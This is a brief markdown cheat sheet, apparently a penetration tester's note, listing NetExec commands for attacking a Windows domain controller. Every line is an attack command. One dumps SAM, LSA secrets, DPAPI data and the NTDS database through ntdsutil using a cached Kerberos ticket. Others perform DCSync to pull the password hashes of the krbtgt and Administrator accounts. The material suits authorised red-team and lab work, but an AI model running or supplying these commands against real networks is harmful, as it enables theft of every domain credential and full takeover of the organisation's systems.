# Netexec

### 1) DCSync along with other dumps using ticket

    nxc smb dc01.domain.com --use-kcache --sam --lsa --dpapi -M ntdsutil

### 2) DCSync for a specific user account

    nxc smb dc01.domain.com -d domain -u username -p 'password' --ntds --user krbtgt
    nxc smb dc01.domain.com -d domain -u username -p 'password' --ntds --user Administrator
